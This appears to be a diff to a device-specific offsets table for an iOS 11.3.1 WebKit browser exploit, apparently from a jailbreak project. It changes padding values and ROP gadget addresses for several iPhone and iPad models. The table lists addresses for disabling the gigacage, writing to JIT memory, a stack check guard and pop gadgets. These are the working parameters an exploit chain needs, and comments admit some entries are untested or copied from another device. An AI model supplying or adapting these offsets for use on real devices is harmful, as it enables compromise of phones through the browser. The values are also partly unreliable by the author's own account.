@@ -33,7 +33,7 @@ var Offsets = function Offsets(sw_vers, productname) {
     
     //iPad Air
     offsets["iPad Air"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
         callbacks: 0x1b2b99698,
@@ -53,7 +53,7 @@ var Offsets = function Offsets(sw_vers, productname) {
     
     //iPhone 5S
     offsets["iPhone 5S"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
         callbacks: 0x1b3199698,
@@ -73,7 +73,7 @@ var Offsets = function Offsets(sw_vers, productname) {
 
     //iPhone 6
     offsets["iPhone 6"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
         callbacks: 0x1b31a1698,
@@ -91,11 +91,11 @@ var Offsets = function Offsets(sw_vers, productname) {
         linkcode_gadget: 0
     };
     
-     //iPhone 6+
+    //iPhone 6+
     // Note: No need for gigacage related offsets for this device.
     // These work on my device.
     offsets["iPhone 6+"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0,
         callbacks: 0x1b319fd28,
@@ -117,7 +117,7 @@ var Offsets = function Offsets(sw_vers, productname) {
     // Note: No need for gigacage related offsets for this device, but added them anyway.
     // TODO: Test offsets.
     offsets["iPhone 6S"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
         callbacks: 0x1b31a1698,
@@ -130,9 +130,9 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b31a10c8,
         usefastpermissions_jitcopy: 0x1b1bf0018,
         ptr_stack_check_guard: 0x1b30f9ef8,
-        modelio_popx8: 0x18d2f6574,
-        coreaudio_popx2: 0x18409ddcc,
-        linkcode_gadget: 0x187bd12c0
+        modelio_popx8: 0x18d2f6564,
+        coreaudio_popx2: 0x18409ddbc,
+        linkcode_gadget: 0x187bd18c8 
     };
     
     //iPhone 6S+
@@ -140,7 +140,7 @@ var Offsets = function Offsets(sw_vers, productname) {
     
     //iPhone 7
     offsets["iPhone 7"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
         g_gigacagebaseptrs: 0x1b1d08000,
@@ -161,7 +161,7 @@ var Offsets = function Offsets(sw_vers, productname) {
     
     //iPhone 7+
     offsets["iPhone 7+"][11.31] = {
-        padding: 0x20,
+        padding: 0x18,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
         g_gigacagebaseptrs: 0x1b1d08000,
@@ -205,7 +205,7 @@ var Offsets = function Offsets(sw_vers, productname) {
         padding: 0x20,
         vtable: 0x189c9a808,
         disableprimitivegigacage: 0x18851a7d4,
-        callbacks: 0x1b335bd28,
+        callbacks: 0x1b335d698,
         g_gigacagebaseptrs: 0x1b1d08000,
         g_typedarraypoisons: 0x1b335d720,
         longjmp: 0x180b126e8,
@@ -215,6 +215,8 @@ var Offsets = function Offsets(sw_vers, productname) {
         jit_writeseperateheaps_func: 0x1b335d0c8,
         usefastpermissions_jitcopy: 0x1b1d04018,
         ptr_stack_check_guard: 0x1ac3efc40,
+        
+        //Asuming these are correct, just copied from the i8
         modelio_popx8: 0x18d2f6564,
         coreaudio_popx2: 0x18409ddbc,
         linkcode_gadget: 0x187bd18c8
